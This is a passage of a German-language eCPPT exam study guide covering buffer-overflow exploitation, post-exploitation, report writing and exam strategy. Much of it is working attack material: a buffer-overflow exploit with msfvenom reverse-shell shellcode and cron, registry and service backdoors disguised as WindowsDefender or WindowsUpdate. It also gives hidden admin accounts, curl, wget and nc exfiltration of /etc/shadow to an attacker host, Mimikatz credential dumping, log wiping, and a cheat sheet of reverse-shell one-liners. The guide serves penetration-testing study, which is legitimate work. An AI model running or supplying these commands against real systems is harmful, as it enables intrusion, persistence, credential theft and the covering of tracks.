
# Buffer
buffer = b"A" * offset

# EIP Overwrite (JMP ESP - Little Endian!)
eip = b"\xaf\x11\x50\x62"

# NOP Sled (gibt Shellcode Platz zu dekodieren)
nops = b"\x90" * 16

# Shellcode von msfvenom
shellcode = (
b"\xda\xc1\xba\x37\x5d\xcd\x6a\xd9\x74\x24\xf4\x5e\x29\xc9"
b"\xb1\x52\x31\x56\x17\x83\xc6\x04\x03\x19\xd5\x3a\xa8\x59"
# ... kompletter shellcode ...
)

# Payload zusammenbauen
payload = buffer + eip + nops + shellcode

# Netcat Listener starten VORHER:
# nc -lvnp 4444

# Exploit senden
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    s.send(b"TRUN /.:/" + payload)
    s.close()
    print("[+] Exploit sent!")
except Exception as e:
    print(f"[-] Error: {e}")
```

**Listener:**

```bash
nc -lvnp 4444

# Nach Exploit:
# Listening on 0.0.0.0 4444
# Connection received!
# Microsoft Windows [Version ...]
# C:\> whoami
```

### 7.8 Troubleshooting

**Kein Shell erhalten?**

1. **Bad Chars nochmal prüfen:**
   - Shellcode könnte truncated sein
   - Mehr Chars sind bad

2. **NOP Sled vergrößern:**
   ```python
   nops = b"\x90" * 32  # Statt 16
   ```

3. **Anderes Shellcode Format:**
   ```bash
   msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f python -b "\x00\x0a\x0d"
   ```

4. **Anderer Payload:**
   ```bash
   # Staged Payload (kleiner):
   msfvenom -p windows/shell/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f c -b "\x00\x0a\x0d"
   ```

5. **Space nach EIP zu klein?**
   - Mehr Padding hinzufügen
   - Oder JMP backwards zu größerem Buffer

---

## 8. POST-EXPLOITATION

### 8.1 Shell Upgrading

**Linux - Netcat zu TTY:**

```bash
# Python PTY:
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Dann:
Ctrl+Z  # Background
stty raw -echo; fg
export TERM=xterm
export SHELL=bash

# Jetzt: Tab Completion, Arrows, Ctrl+C funktioniert!
```

**Alternative:**

```bash
# Script:
script /dev/null -c bash

# Socat:
socat file:`tty`,raw,echo=0 tcp-listen:4444
# Von Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:YOUR_IP:4444
```

### 8.2 Persistence - Linux

**SSH Key:**

```bash
# Key generieren (auf Attacker):
ssh-keygen -f hackkey

# Public Key auf Victim:
mkdir -p /root/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2E..." >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
chmod 700 /root/.ssh

# Login von Attacker:
ssh -i hackkey root@target
```

**Cron Job Backdoor:**

```bash
# Reverse Shell Cron:
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'" | crontab -

# Oder in /etc/crontab:
echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'" >> /etc/crontab

# Oder .bashrc:
echo "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1 &" >> /root/.bashrc
```

**SUID Backdoor:**

```bash
# Bash Copy mit SUID:
cp /bin/bash /tmp/.hidden
chmod +s /tmp/.hidden

# Später (als low-priv user):
/tmp/.hidden -p
# Root Shell!
```

### 8.3 Persistence - Windows

**Registry Run Key:**

```cmd
# User Run:
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Windows\Temp\backdoor.exe" /f

# System Run (benötigt Admin):
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Windows\Temp\backdoor.exe" /f
```

**Scheduled Task:**

```cmd
# Task erstellen:
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\backdoor.exe" /sc onlogon /ru SYSTEM

# Oder mit PowerShell:
$action = New-ScheduledTaskAction -Execute "C:\Windows\Temp\backdoor.exe"
$trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "WindowsUpdate" -User "SYSTEM"
```

**Service:**

```cmd
# Binary als Service:
sc create "WindowsDefender" binpath= "C:\Windows\Temp\backdoor.exe" start= auto
sc start WindowsDefender

# Mit PowerShell:
New-Service -Name "WindowsDefender" -BinaryPathName "C:\Windows\Temp\backdoor.exe" -StartupType Automatic
Start-Service WindowsDefender
```

**User Account:**

```cmd
# Hidden Admin User:
net user hacker Password123! /add
net localgroup administrators hacker /add

# Hidden machen:
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v hacker /t REG_DWORD /d 0 /f
```

### 8.4 Lateral Movement

**PSExec (mit Admin):**

```bash
# Von Linux:
psexec.py domain/user:password@192.168.1.10

# Von Windows:
.\PsExec.exe \\192.168.1.10 -u user -p password cmd
```

**WMI:**

```cmd
# Command ausführen:
wmic /node:192.168.1.10 /user:user /password:password process call create "cmd.exe /c whoami > C:\output.txt"

# Oder mit PowerShell:
$cred = Get-Credential
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami" -ComputerName 192.168.1.10 -Credential $cred
```

**WinRM:**

```powershell
# Remote Session:
Enter-PSSession -ComputerName 192.168.1.10 -Credential domain\user

# Command ausführen:
Invoke-Command -ComputerName 192.168.1.10 -Credential domain\user -ScriptBlock {whoami}

# Von Linux:
evil-winrm -i 192.168.1.10 -u user -p password
```

**RDP:**

```bash
# Mit rdesktop:
rdesktop 192.168.1.10 -u user -p password

# Mit xfreerdp:
xfreerdp /u:user /p:password /v:192.168.1.10 +clipboard

# Mit Pass-the-Hash:
xfreerdp /u:user /pth:NT_HASH /v:192.168.1.10
```

### 8.5 Data Exfiltration

**Linux:**

```bash
# Via Netcat:
# Auf Attacker:
nc -lvnp 4444 > data.zip

# Auf Victim:
cat /tmp/data.zip | nc YOUR_IP 4444

# Via HTTP:
# Auf Attacker:
python3 -m http.server 8000

# Auf Victim:
wget --post-file=/etc/shadow http://YOUR_IP:8000/

# Via curl:
curl -d @/etc/shadow http://YOUR_IP:8000/
```

**Windows:**

```powershell
# Via SMB:
# Auf Attacker:
smbserver.py share . -smb2support

# Auf Victim:
copy C:\sensitive.txt \\YOUR_IP\share\

# Via HTTP (PowerShell):
$wc = New-Object System.Net.WebClient
$wc.UploadFile("http://YOUR_IP:8000/", "C:\sensitive.txt")

# Via Base64:
$data = Get-Content C:\sensitive.txt
$bytes = [System.Text.Encoding]::UTF8.GetBytes($data)
$b64 = [Convert]::ToBase64String($bytes)
$wc.UploadString("http://YOUR_IP:8000/", $b64)
```

### 8.6 Credential Harvesting

**Linux:**

```bash
# Password Files:
cat /etc/passwd
cat /etc/shadow
unshadow passwd shadow > hashes

# History Files:
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.psql_history

# Config Files:
cat ~/.ssh/config
cat ~/.aws/credentials
find / -name "*.conf" 2>/dev/null | xargs grep -i password

# Database:
cat /var/www/html/wp-config.php
cat /var/www/html/config.php

# SSH Keys:
find / -name id_rsa 2>/dev/null
find / -name id_dsa 2>/dev/null
find / -name authorized_keys 2>/dev/null
```

**Windows:**

```cmd
# SAM Database:
reg save HKLM\SAM C:\temp\sam
reg save HKLM\SYSTEM C:\temp\system

# Credentials:
cmdkey /list

# Browser Passwords:
dir C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\Login Data
dir C:\Users\*\AppData\Roaming\Mozilla\Firefox\Profiles\

# Files:
dir /s /b C:\*password*.txt
dir /s /b C:\*password*.xlsx
dir /s /b C:\*.kdbx

# WiFi Passwords:
netsh wlan show profiles
netsh wlan show profile name="SSID" key=clear
```

**Mimikatz:**

```cmd
# Download: https://github.com/gentilkiwi/mimikatz

.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
lsadump::secrets
```

### 8.7 Covering Tracks

**Linux:**

```bash
# History löschen:
history -c
echo "" > ~/.bash_history
rm ~/.bash_history

# Logs löschen:
echo "" > /var/log/auth.log
echo "" > /var/log/syslog
echo "" > /var/log/apache2/access.log

# Timestamps ändern:
touch -r /bin/ls /tmp/backdoor
```

**Windows:**

```cmd
# Event Logs löschen:
wevtutil cl System
wevtutil cl Security
wevtutil cl Application

# Oder alle:
for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"

# PowerShell:
Clear-EventLog -LogName Application,System,Security

# Timestamps ändern:
powershell (Get-Item file.exe).LastWriteTime = (Get-Date "01/01/2020 00:00")
```

---

## 9. REPORT WRITING

### 9.1 Dokumentation während Test

**Wichtig: Dokumentiere ALLES sofort!**

**Template für Notes:**

```
=== HOST: 192.168.1.100 ===

PORTS:
- 21: vsftpd 2.3.4 (anonymous login)
- 22: OpenSSH 7.6p1
- 80: Apache 2.4.29
- 445: Samba 4.7.6

ENUMERATION:
[14:23] FTP anonymous login successful
[14:25] Found backup.zip in /pub folder
[14:30] backup.zip contains credentials: admin:P@ssw0rd123

WEB:
[14:35] Gobuster found /admin directory
[14:40] SQLi in product.php?id= parameter
[14:45] Extracted users table with sqlmap
[14:50] Cracked hash: admin:admin123

EXPLOITATION:
[15:00] SQL Injection → Webshell upload
[15:05] Reverse shell as www-data
[15:10] LinPEAS found writable /etc/passwd
[15:15] Root shell obtained

CREDENTIALS FOUND:
- admin:P@ssw0rd123 (FTP/SSH)
- admin:admin123 (Web Panel)
- root:toor (After privesc)

SCREENSHOTS:
- screenshot_01_nmap.png
- screenshot_02_sqli.png
- screenshot_03_root_shell.png

FLAGS:
- user.txt: a1b2c3d4e5f6...
- root.txt: f6e5d4c3b2a1...
```

### 9.2 Report Struktur

**1. Executive Summary (1 Seite)**
- Wer du bist
- Wann wurde getestet
- Was wurde getestet
- High-Level Findings
- Risk Summary (Critical/High/Medium/Low counts)
- Empfehlungen (kurz)

**Beispiel:**
```
During the penetration test conducted between December 10-15, 2025,
several critical vulnerabilities were identified that could lead to
complete system compromise. The assessment revealed 3 Critical, 5 High,
and 8 Medium severity findings. Immediate remediation is recommended
for all Critical and High severity issues.
```

**2. Scope**
- IP Ranges getestet
- URLs/Domains
- Was war erlaubt/verboten
- Test Methodology

**3. Findings (Hauptteil)**

**Pro Vulnerability:**

```markdown
### 4.1 SQL Injection in Product Page

**Severity:** Critical (CVSS: 9.8)

**Affected Systems:**
- http://192.168.1.100/product.php

**Description:**
The product.php page is vulnerable to SQL injection through the 'id'
parameter. An attacker can manipulate SQL queries to extract sensitive
data from the database, including user credentials.

**Proof of Concept:**
```sql
http://192.168.1.100/product.php?id=1' UNION SELECT 1,group_concat(username,':',password),3,4 FROM users--
```

**Impact:**
- Complete database compromise
- Disclosure of all user credentials
- Potential for Remote Code Execution via webshell upload
- Full system compromise achieved during testing

**Evidence:**
[Screenshot: SQL Injection successful extraction]
[Screenshot: Database contents displayed]

**Remediation:**
1. Implement prepared statements/parameterized queries
2. Apply input validation and sanitization
3. Use Web Application Firewall (WAF)
4. Follow OWASP secure coding guidelines
5. Regular security assessments

**References:**
- OWASP Top 10 2021: A03:2021-Injection
- CWE-89: SQL Injection
```

**4. Attack Path Diagram**

```
1. Nmap Scan → Port 80 Open
                ↓
2. Gobuster → /admin directory found
                ↓
3. SQL Injection → Database extraction
                ↓
4. Password Cracking → Valid credentials
                ↓
5. Webshell Upload → www-data shell
                ↓
6.Privilege Escalation → SUID binary exploit

7. Root Access → Complete System Compromise
```

**5. Appendix**
- Full tool outputs
- Complete command history
- All screenshots
- Network diagrams
- Credentials list

### 9.3 Severity Ratings

**CVSS Calculator:** https://www.first.org/cvss/calculator/3.1

**Beispiel Ratings:**

```
Critical (9.0-10.0):
- SQL Injection leading to RCE
- Unauthenticated Remote Code Execution
- Default credentials on critical systems
- DCSync attack possible

High (7.0-8.9):
- Privilege Escalation to root/SYSTEM
- Stored XSS in admin panel
- Authentication bypass
- Sensitive data exposure

Medium (4.0-6.9):
- Local File Inclusion
- Insecure permissions
- Information disclosure
- Weak password policy

Low (0.1-3.9):
- Missing security headers
- Version disclosure
- Self-XSS
- Low-impact information leak
```

### 9.4 Screenshot Best Practices

**Was auf Screenshots zeigen:**

1. **Command + Output:**
```
[Terminal showing:]
┌──(kali㉿kali)-[~]
└─$ nmap -sV -sC 192.168.1.100
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed
22/tcp open  ssh     OpenSSH 7.6p1
```

2. **Proof of Exploitation:**
```
[Browser showing:]
URL: http://target/product.php?id=1' UNION SELECT...
Page content:
admin:5f4dcc3b5aa765d61d8327deb882cf99
user:e10adc3949ba59abbe56e057f20f883e
```

3. **Root/Admin Shell:**
```
[Terminal showing:]
www-data@victim:/tmp$ ./exploit
[+] Spawning root shell...
root@victim:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
root@victim:/tmp# cat /root/root.txt
a1b2c3d4e5f6g7h8i9j0...
```

**Screenshot Tools:**
- Flameshot (Linux)
- Greenshot (Windows)
- Snipping Tool (Windows)

**Wichtig:**
- Zeitstempel sichtbar
- Terminal prompt zeigt user@host
- Sensitive info zensieren wenn nötig

### 9.5 Professional Report Tips

**DO:**
- Professional language
- Clear and concise
- Technical accuracy
- Reproducible PoCs
- Actionable recommendations
- Risk ratings justified

**DON'T:**
- Slang or informal language
- "Pwned" or "Owned" terminology
- Missing evidence
- Copy-paste from tools without context
- Over-technical for Executive Summary
- Grammar/spelling errors

**Language Examples:**

❌ **Bad:**
"I pwned the box by exploiting a sick SQLi vuln and got root ez"

✅ **Good:**
"A SQL injection vulnerability was identified in the product.php page, which was successfully exploited to obtain initial access. Subsequent privilege escalation techniques resulted in root-level access to the system."

---

## 10. EXAM-SPECIFIC TIPS

### 10.1 Time Management

**7 Tage Testing Phase:**

```
Tag 1-2: Reconnaissance & Initial Foothold
- Vollständige Enumeration aller Hosts
- Initial Access auf erstem System
- Dokumentation beginnen

Tag 3-4: Lateral Movement & Pivoting
- Interne Netzwerke erkunden
- Weitere Systeme kompromittieren
- Credentials sammeln

Tag 5-6: Privilege Escalation & Cleanup
- Root/Admin auf allen Systemen
- Alle Flags sammeln
- Screenshots vervollständigen

Tag 7: Buffer Overflow (falls Teil der Prüfung)
- Oder Reserve für Probleme
```

**7 Tage Report Phase:**

```
Tag 8-9: Report Writing
- Executive Summary
- Technical Findings (1-2 Findings pro Tag)

Tag 10-11: Technical Details
- Detaillierte Exploitation Steps
- Screenshots annotieren

Tag 12-13: Review & Refinement
- Spellcheck
- Technical accuracy
- Screenshot quality

Tag 14: Final Submission
- PDF generieren
- Quality check
- Submit!
```

### 10.2 Common Pitfalls

**1. Insufficient Enumeration**
```bash
# BAD: Nur Quick Scan
nmap 192.168.1.100

# GOOD: Vollständiger Scan
nmap -sC -sV -p- 192.168.1.100 -oA full_scan
```

**2. Vergessen zu Dokumentieren**
- Screenshot SOFORT machen
- Command history in File speichern
- Notes während der Arbeit

**3. Kein Backup von Shells**
- Immer 2-3 verschiedene Backdoors
- Verschiedene Ports
- Persistence mechanisms

**4. Pivot-Routen verlieren**
```bash
# Dokumentiere alle Routen!
# Host A → Host B → Host C
# Wenn B crashed, ist C unerreichbar!
```

**5. Report zu technisch/zu simpel**
- Executive Summary: Business impact
- Technical Details: Vollständige Reproduction steps

### 10.3 Must-Have Tools auf Kali

**Installiere/Update vor Prüfung:**

```bash
# System Update
sudo apt update && sudo apt upgrade -y

# Essential Tools (falls nicht installiert)
sudo apt install -y \
    nmap gobuster nikto \
    smbclient enum4linux \
    sqlmap burpsuite \
    metasploit-framework \
    netcat socat \
    python3-pip \
    evil-winrm \
    chisel \
    bloodhound neo4j

# Python Tools
pip3 install impacket

# Static Binaries
mkdir ~/tools
cd ~/tools
wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap
wget https://github.com/jpillora/chisel/releases/latest/download/chisel_linux_amd64.gz
gunzip chisel_linux_amd64.gz
mv chisel_linux_amd64 chisel
chmod +x *

# Privesc Scripts
cd ~/tools
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
```

### 10.4 Command History Template

**Erstelle während Prüfung:**

```bash
# commands.txt
# Format: [Timestamp] Command → Result

[2024-12-15 14:30:15] nmap -sV -sC 192.168.1.100 → Ports 21,22,80,445 open
[2024-12-15 14:35:20] gobuster dir -u http://192.168.1.100 -w common.txt → Found /admin, /uploads
[2024-12-15 14:40:10] sqlmap -u "http://192.168.1.100/product.php?id=1" --dbs → Found 'webapp' database
[2024-12-15 14:45:30] sqlmap -u "..." -D webapp --tables → Found 'users' table
[2024-12-15 14:50:00] sqlmap -u "..." -D webapp -T users --dump → Extracted 5 user hashes
[2024-12-15 15:00:00] john --format=Raw-MD5 hashes.txt → Cracked: admin:password123

# Automatisch speichern:
script -a commands.txt
# Oder:
export PROMPT_COMMAND='history -a'
```

### 10.5 Network Diagram

**Dokumentiere Netzwerk-Topologie:**

```
Internet
    |
[Attacker: 10.10.14.50]
    |
    ↓ (Initial Access)
[DMZ Host: 192.168.1.100]
- OS: Ubuntu 18.04
- Services: FTP, SSH, HTTP
- Vuln: SQL Injection
- Access: www-data → root
    |
    ↓ (Pivot via SSH Tunnel)
[Internal Network: 172.16.1.0/24]
    |
    ├─→ [Web Server: 172.16.1.10]
    |   - OS: Windows Server 2016
    |   - Vuln: Unquoted Service Path
    |   - Access: IIS User → SYSTEM
    |
    ├─→ [Database: 172.16.1.20]
    |   - OS: Linux (CentOS 7)
    |   - Vuln: Weak MySQL Creds
    |   - Access: mysql → root
    |
    └─→ [Domain Controller: 172.16.1.30]
        - OS: Windows Server 2019
        - Vuln: Kerberoasting
        - Access: User → Domain Admin
```

### 10.6 Flag Management

**Organize Flag Collection:**

```bash
# flags.txt
[192.168.1.100 - User Flag]
Location: /home/john/user.txt
Flag: a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6
Timestamp: 2024-12-15 15:30:00
Method: SQL Injection → Webshell → Reverse Shell

[192.168.1.100 - Root Flag]
Location: /root/root.txt
Flag: p6o5n4m3l2k1j0i9h8g7f6e5d4c3b2a1
Timestamp: 2024-12-15 16:00:00
Method: SUID vim privilege escalation

[172.16.1.10 - User Flag]
Location: C:\Users\Administrator\Desktop\user.txt
Flag: z9y8x7w6v5u4t3s2r1q0p9o8n7m6l5k4
Timestamp: 2024-12-16 10:30:00
Method: Pivoted via SSH → Unquoted Service Path

[172.16.1.10 - Root Flag]
Location: C:\Users\Administrator\Desktop\root.txt
Flag: k4l5m6n7o8p9q0r1s2t3u4v5w6x7y8z9
Timestamp: 2024-12-16 11:00:00
Method: Service exploitation → SYSTEM shell
```

### 10.7 Troubleshooting Common Issues

**Problem 1: Shell stirbt sofort**

```bash
# Lösung: Stabilize Shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
```

**Problem 2: Keine Route zum internen Netz**

```bash
# Check Routes:
ip route
netstat -rn

# Add Route (wenn missing):
ip route add 172.16.1.0/24 via 192.168.1.100

# Oder mit Chisel:
./chisel server -p 8000 --reverse
# Auf Pivot:
./chisel client ATTACKER_IP:8000 R:socks
```

**Problem 3: Exploit funktioniert nicht**

```bash
# Checklist:
1. Python Version? (Python2 vs Python3)
2. Dependencies installiert?
3. Richtige IP/Port?
4. Firewall blockiert?
5. Antivirus?

# Debugging:
# Füge prints hinzu:
print(f"[DEBUG] Connecting to {ip}:{port}")
print(f"[DEBUG] Sending payload: {payload[:100]}")
```

**Problem 4: Keine Schreibrechte für Backdoor**

```bash
# Alternative Locations:
/tmp/
/dev/shm/
/var/tmp/
/home/user/.cache/
C:\Windows\Temp\
C:\Users\Public\
C:\ProgramData\
```

**Problem 5: Port ist gefiltert**

```bash
# Alternative Ports probieren:
Common allowed: 80, 443, 53, 8080, 8443

# Reverse Shell auf Port 443:
nc -lvnp 443
# Victim:
bash -i >& /dev/tcp/ATTACKER/443 0>&1

# Oder DNS Tunnel (Port 53)
# Oder ICMP Tunnel
```

### 10.8 Last-Minute Checklist

**Vor dem Start:**
- [ ] VPN connected und stabil?
- [ ] Alle Tools funktionieren?
- [ ] Genug Speicherplatz für Screenshots?
- [ ] Backup-Plan für Internet-Ausfall?
- [ ] Note-Taking System bereit?

**Während des Tests:**
- [ ] Jeder Schritt dokumentiert?
- [ ] Screenshots mit Timestamp?
- [ ] Commands gespeichert?
- [ ] Flags sicher gespeichert?
- [ ] Backup Shells aktiv?

**Vor Report-Submission:**
- [ ] Alle Flags im Report?
- [ ] Alle Screenshots annotiert?
- [ ] Spellcheck durchgeführt?
- [ ] CVSS Scores korrekt?
- [ ] Exploitation steps reproduzierbar?
- [ ] Executive Summary verständlich?
- [ ] PDF korrekt formatiert?

### 10.9 Mental Health Tips

**Es ist ein Marathon, kein Sprint:**

```
Tag 1-3: Enthusiasmus
- Energie ist hoch
- Viele Entdeckungen
- Motivation top

Tag 4-6: Frustration
- Stuck at pivoting?
- Exploit funktioniert nicht?
- → NORMAL! Pause machen!

Tag 7: Durchbruch oder Panic
- Alles kommt zusammen, ODER
- Noch nicht alles erreicht
- → Ruhig bleiben, systematisch vorgehen

Tag 8-14: Report Grind
- Weniger aufregend
- Aber GENAU SO WICHTIG
- 50% der Note!
```

**Tipps:**
- Schlafe genug (min. 6h)
- Regelmäßige Pausen (Pomodoro: 50min work, 10min break)
- Iss vernünftig
- Bewege dich
- Wenn stuck: Spaziergang, dann fresh brain

**Stuck? Try This:**

1. **Schritt zurück**
   - Was habe ich übersehen?
   - Nochmal enumerate

2. **Enumeration intensivieren**
   ```bash
   # Vielleicht port missed?
   nmap -p- --min-rate 1000
   
   # UDP?
   nmap -sU --top-ports 100
   
   # Hidden directories?
   gobuster mit größerer wordlist
   ```

3. **Google ist dein Freund**
   ```
   "service version exploit"
   "CVE-YEAR-XXXX exploit github"
   site:exploit-db.com service-name
   ```

4. **Community (aber vorsichtig!)**
   - ECPPT Discord/Forums
   - Keine Spoiler fragen
   - Nur Hints: "Stuck at X, any tips?"

### 10.10 Report Writing Efficiency

**Templates nutzen:**

```markdown
# Finding Template (Markdown)

## X.X [Vulnerability Name]

**Severity:** [Critical/High/Medium/Low]
**CVSS Score:** X.X
**Affected Assets:**
- [IP/URL]

**Description:**
[2-3 sentences describing the vulnerability]

**Technical Details:**
[Detailed explanation]

**Proof of Concept:**
```
[commands/code]
```

**Impact:**
- [Impact 1]
- [Impact 2]
- [Impact 3]

**Remediation:**
1. [Step 1]
2. [Step 2]
3. [Step 3]

**References:**
- [CWE/CVE]
- [OWASP Link]

**Evidence:**
![Screenshot Description](screenshots/screenshot_XX.png)
```

**Report in Markdown schreiben, dann zu PDF:**

```bash
# Mit pandoc:
sudo apt install pandoc texlive-latex-base

# Convert:
pandoc report.md -o report.pdf \
  --toc \
  --number-sections \
  -V geometry:margin=1in \
  --highlight-style=tango

# Oder mit Ghostwriter/Typora (GUI)
```

### 10.11 Final Words of Wisdom

**Was ECPPT wirklich testet:**

1. **Methodology** (40%)
   - Systematisches Vorgehen
   - Vollständige Enumeration
   - Nichts übersehen

2. **Technical Skills** (30%)
   - Exploitation
   - Pivoting
   - Privilege Escalation

3. **Documentation** (30%)
   - Report Quality
   - Reproducibility
   - Professional Presentation

**Keys to Success:**

✅ **Enumerate, Enumerate, Enumerate**
- Meiste Zeit sollte hier verbracht werden
- Du kannst nicht exploiten was du nicht findest

✅ **Document as you go**
- Nicht am Ende alles zusammenkratzen
- Real-time documentation = accurate

✅ **Think like an attacker, write like a consultant**
- Exploitation: Kreativ, aggressive
- Report: Professional, constructive

✅ **Test your exploits**
- PoC muss reproduzierbar sein
- Testen bevor du im Report erwähnst

✅ **Use your time wisely**
- 14 Tage klingen viel
- Report braucht Zeit!
- Start report writing early

**Häufigste Fail-Gründe:**

❌ Insufficient enumeration → Missing pivots
❌ Poor documentation → Can't prove findings
❌ Unprofessional report → Failed despite technical success
❌ Missing flags → Incomplete compromise
❌ Time management → Rushed report

---

## 11. QUICK REFERENCE CHEAT SHEET

### One-Liners Collection

**Reverse Shells:**

```bash
# Bash
bash -i >& /dev/tcp/IP/PORT 0>&1
bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'

# Netcat
nc -e /bin/bash IP PORT
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc IP PORT >/tmp/f

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# PHP
php -r '$sock=fsockopen("IP",PORT);exec("/bin/bash -i <&3 >&3 2>&3");'

# PowerShell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

**File Transfer:**

```bash
# Linux → Windows
python3 -m http.server 80
# Windows: 
certutil -urlcache -f http://IP/file.exe file.exe
powershell -c "(New-Object Net.WebClient).DownloadFile('http://IP/file.exe','C:\file.exe')"

# Windows → Linux
# Linux:
nc -lvnp 4444 > file.exe
# Windows:
nc IP 4444 < file.exe

# SMB
# Linux:
smbserver.py share . -smb2support
# Windows:
copy \\IP\share\file.exe C:\file.exe
```

**Port Scanning (no nmap):**

```bash
# Bash
for port in {1..1000}; do timeout 1 bash -c "</dev/tcp/IP/$port" && echo "$port open"; done 2>/dev/null

# Netcat
nc -zv IP 1-1000
```

**Quick Enumeration:**

```bash
# Linux
id; uname -a; cat /etc/*-release; ip a; ps aux; sudo -l; find / -perm -4000 2>/dev/null

# Windows
whoami; whoami /all; systeminfo; ipconfig /all; net user; net localgroup administrators; wmic service get name,pathname,startmode | findstr /i auto
```

---

## FINAL EXAM STRATEGY

### Day-by-Day Plan

**Day 1 (8 hours):**
```
08:00-10:00: External Network Scan
- All hosts
- All ports
- Service enumeration

10:00-12:00: Web Application Testing
- Gobuster
- Nikto
- Manual testing

12:00-13:00: Lunch Break + Documentation

13:00-16:00: Initial Exploitation
- First foothold
- Shell stabilization
- Basic enumeration

16:00-17:00: Document Day 1
- Screenshots
- Commands
- Findings
```

**Day 2-3: Pivot & Expand**
**Day 4-5: Privilege Escalation**
**Day 6-7: Cleanup & Verification**
**Day 8-14: Report Writing**

### Remember:

> "Enumeration is key. If you're stuck, enumerate more."
> "Document everything. Your future self will thank you."
> "The report is 50% of your grade. Treat it as such."
> "You got this! Stay calm, stay systematic, stay persistent."

---

# VIEL ERFOLG BEI DEINER ECPPT PRÜFUNG! 🎯

**Du bist vorbereitet. Vertraue dem Prozess. Follow the methodology.**

**When in doubt:**
1. Enumerate more
2. Google the error
3. Try alternative approach
4. Take a break
5. Come back with fresh eyes

**You will pass. Just stay systematic and document everything!** 
